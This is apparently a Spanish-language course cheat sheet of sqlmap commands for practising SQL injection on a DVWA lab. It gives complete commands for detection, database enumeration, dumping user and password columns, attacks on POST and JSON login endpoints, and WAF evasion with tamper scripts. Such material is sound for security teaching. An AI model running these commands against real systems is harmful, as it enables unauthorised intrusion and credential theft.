# Comandos SQLMap — Módulo 2

Referencia rápida de comandos de `sqlmap` para usar en entornos autorizados, especialmente sobre DVWA.

---

## Preparación mínima en DVWA

Antes de usar `sqlmap`:

1. loguearte en DVWA,
2. poner `Security = Low`,
3. copiar tu cookie de sesión,
4. confirmar manualmente que el parámetro es inyectable.

Cookie típica:

```text
PHPSESSID=TU_SESION; security=low
```

---

## SQLMap básico contra DVWA (GET)

Target clásico del módulo SQLi:

```bash
sqlmap -u "https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --batch
```

Qué hace:
- detecta si el parámetro `id` es inyectable,
- intenta identificar el motor,
- prueba técnicas básicas sin pedir confirmaciones.

---

## Enumeración básica

```bash
# Ver bases de datos
sqlmap -u "https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --dbs --batch

# Ver tablas de una base
sqlmap -u "https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  -D dvwa --tables --batch

# Ver columnas de una tabla
sqlmap -u "https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  -D dvwa -T users --columns --batch

# Extraer filas
sqlmap -u "https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  -D dvwa -T users --dump --batch
```

---

## Dump selectivo

Conviene no tirar `--dump` a todo sin filtro.

```bash
sqlmap -u "https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  -D dvwa -T users -C "user,password" --dump --batch
```

---

## POST data

Cuando el parámetro vulnerable viaja por POST:

```bash
sqlmap -u "https://target/login" \
  --data="username=test&password=test&Login=Login" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --batch
```

Si sabés qué parámetro querés probar:

```bash
sqlmap -u "https://target/login" \
  --data="username=test&password=test&Login=Login" \
  -p username \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --batch
```

---

## Request completo desde Burp

Muchas veces es más cómodo exportar el request a archivo:

```bash
sqlmap -r request.txt --batch
```

Muy útil cuando el request tiene:
- cookies largas,
- headers custom,
- body complejo,
- CSRF token,
- JSON.

---

## JSON / APIs

```bash
sqlmap -u "https://target/api/login" \
  --data='{"email":"test@test.com","password":"test"}' \
  --headers="Content-Type: application/json" \
  -p email \
  --batch
```

---

## Flags útiles

| Opción | Para qué sirve |
|---|---|
| `--batch` | no pregunta nada interactivo |
| `--dbs` | lista bases de datos |
| `--tables` | lista tablas |
| `--columns` | lista columnas |
| `--dump` | extrae datos |
| `-D` | elegir base |
| `-T` | elegir tabla |
| `-C` | elegir columnas |
| `-p` | elegir parámetro a testear |
| `--cookie` | mandar sesión autenticada |
| `-r request.txt` | usar request completo |
| `--level` | profundidad de pruebas |
| `--risk` | agresividad de payloads |
| `--technique` | restringir técnicas |
| `--threads` | paralelismo |
| `--output-dir` | guardar resultados en carpeta |

---

## Técnicas (`--technique`)

Las letras más comunes son:

| Letra | Técnica |
|---|---|
| `B` | Boolean-based blind |
| `E` | Error-based |
| `U` | UNION query |
| `S` | Stacked queries |
| `T` | Time-based blind |
| `Q` | Inline queries |

Ejemplo:

```bash
sqlmap -u "https://target/item?id=1" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --technique=BEUST \
  --batch
```

---

## Level y risk

Empezar simple:

```bash
sqlmap -u "https://target/item?id=1" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --level=1 --risk=1 --batch
```

Subir solo si hace falta:

```bash
sqlmap -u "https://target/item?id=1" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --level=5 --risk=3 --batch
```

> Más `level` y más `risk` = más requests, más ruido, más chances de romper algo.

---

## Enumeración del motor y contexto

```bash
# Banner / versión
sqlmap -u "https://target/item?id=1" --banner --batch

# Usuario actual
sqlmap -u "https://target/item?id=1" --current-user --batch

# Base actual
sqlmap -u "https://target/item?id=1" --current-db --batch

# ¿Es DBA?
sqlmap -u "https://target/item?id=1" --is-dba --batch
```

---

## Output y evidencia

```bash
sqlmap -u "https://target/item?id=1" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --dbs \
  --output-dir=sqlmap-output \
  --batch
```

---

## WAF / evasión básica

No arrancar por acá si todavía no entendiste la falla.

```bash
sqlmap -u "https://target/item?id=1" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --random-agent \
  --tamper=space2comment \
  --batch
```

Otros tampers conocidos:

```bash
--tamper=between
--tamper=charencode
--tamper=space2dash
```

---

## One-liners útiles para clase

```bash
# Confirmación rápida
sqlmap -u "https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --batch

# Ver tablas
sqlmap -u "https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  -D dvwa --tables --batch

# Ver columnas de users
sqlmap -u "https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  -D dvwa -T users --columns --batch
```

---

## Flujo recomendado

1. confirmar manualmente con `'` o `UNION SELECT`,
2. correr `sqlmap --batch`,
3. enumerar `--dbs`,
4. bajar a `--tables`,
5. bajar a `--columns`,
6. hacer dump selectivo.

---

## Notas

- `sqlmap` no reemplaza entender la vulnerabilidad.
- Contra labs como **DVWA**, funciona bien para enseñar el flujo completo.
- Contra apps más modernas como **Juice Shop**, puede seguir siendo útil, pero no siempre es tan didáctico para el patrón clásico.
- Usarlo solo en objetivos autorizados.
